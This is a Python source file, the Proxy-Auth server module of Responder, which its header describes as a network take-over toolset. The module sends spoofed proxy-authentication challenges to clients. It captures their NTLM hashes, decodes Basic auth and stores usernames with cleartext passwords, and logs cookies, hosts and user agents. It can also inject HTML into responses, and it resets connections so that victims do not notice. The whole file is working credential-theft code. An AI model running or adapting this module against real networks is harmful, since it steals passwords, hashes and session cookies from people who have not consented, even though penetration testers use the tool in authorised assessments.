#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from responder.src.utils import *

if responder.src.settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler, StreamRequestHandler
else:
    from SocketServer import BaseRequestHandler, StreamRequestHandler
from servers.HTTP import ParseHTTPHash
from responder.src.packets import *


def GrabUserAgent(data):
    UserAgent = re.findall(r"(?<=User-Agent: )[^\r]*", data)
    if UserAgent:
        print(text("[Proxy-Auth] %s" % color("User-Agent        : " + UserAgent[0], 2)))


def GrabCookie(data):
    Cookie = re.search(r"(Cookie:*.\=*)[^\r\n]*", data)

    if Cookie:
        Cookie = Cookie.group(0).replace("Cookie: ", "")
        if len(Cookie) > 1:
            if responder.src.settings.Config.Verbose:
                print(
                    text("[Proxy-Auth] %s" % color("Cookie           : " + Cookie, 2))
                )

        return Cookie
    return False


def GrabHost(data):
    Host = re.search(r"(Host:*.\=*)[^\r\n]*", data)

    if Host:
        Host = Host.group(0).replace("Host: ", "")
        if responder.src.settings.Config.Verbose:
            print(text("[Proxy-Auth] %s" % color("Host             : " + Host, 2)))

        return Host
    return False


def PacketSequence(data, client, Challenge):
    NTLM_Auth = re.findall(r"(?<=Authorization: NTLM )[^\r]*", data)
    Basic_Auth = re.findall(r"(?<=Authorization: Basic )[^\r]*", data)
    if NTLM_Auth:
        Packet_NTLM = b64decode("".join(NTLM_Auth))[8:9]
        if Packet_NTLM == b"\x01":
            if responder.src.settings.Config.Verbose:
                print(
                    text(
                        "[Proxy-Auth] Sending NTLM authentication request to %s"
                        % client.replace("::ffff:", "")
                    )
                )
            Buffer = NTLM_Challenge(
                ServerChallenge=NetworkRecvBufferPython2or3(Challenge)
            )
            Buffer.calculate()
            Buffer_Ans = WPAD_NTLM_Challenge_Ans(
                Payload=b64encode(NetworkSendBufferPython2or3(Buffer)).decode("latin-1")
            )
            return Buffer_Ans

        if Packet_NTLM == b"\x03":
            NTLM_Auth = b64decode("".join(NTLM_Auth))
            ParseHTTPHash(NTLM_Auth, Challenge, client, "Proxy-Auth")
            GrabUserAgent(data)
            GrabCookie(data)
            GrabHost(data)
            # Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject) #While at it, grab some SMB hashes...
            # Buffer.calculate()
            # Return a TCP RST, so the client uses direct connection and avoids disruption.
            return RST
        else:
            return IIS_Auth_Granted(
                Payload=responder.src.settings.Config.HtmlToInject
            )  # Didn't work? no worry, let's grab hashes via SMB...

    elif Basic_Auth:
        GrabUserAgent(data)
        GrabCookie(data)
        GrabHost(data)
        ClearText_Auth = b64decode("".join(Basic_Auth).encode("latin-1"))
        SaveToDb(
            {
                "module": "Proxy-Auth",
                "type": "Basic",
                "client": client,
                "user": ClearText_Auth.decode("latin-1").split(":")[0],
                "cleartext": ClearText_Auth.decode("latin-1").split(":")[1],
            }
        )

        return False
    else:
        if responder.src.settings.Config.Basic:
            Response = WPAD_Basic_407_Ans()
            if responder.src.settings.Config.Verbose:
                print(
                    text(
                        "[Proxy-Auth] Sending BASIC authentication request to %s"
                        % client.replace("::ffff:", "")
                    )
                )

        else:
            Response = WPAD_Auth_407_Ans()

        return str(Response)


class Proxy_Auth(BaseRequestHandler):

    def handle(self):
        try:
            Challenge = RandomChallenge()
            while True:
                self.request.settimeout(3)
                remaining = 10 * 1024 * 1024  # setting max recieve size
                data = ""
                while True:
                    buff = ""
                    buff = NetworkRecvBufferPython2or3(self.request.recv(8092))
                    if buff == "":
                        break
                    data += buff
                    remaining -= len(buff)
                    # check if we recieved the full header
                    if data.find("\r\n\r\n") != -1:
                        # we did, now to check if there was anything else in the request besides the header
                        if data.find("Content-Length") == -1:
                            # request contains only header
                            break
                        else:
                            # searching for that content-length field in the header
                            for line in data.split("\r\n"):
                                if line.find("Content-Length") != -1:
                                    line = line.strip()
                                    remaining = int(line.split(":")[1].strip()) - len(
                                        data
                                    )
                    if remaining <= 0:
                        break
                if data == "":
                    break

                else:
                    Buffer = PacketSequence(data, self.client_address[0], Challenge)
                    self.request.send(NetworkSendBufferPython2or3(Buffer))

        except:
            pass
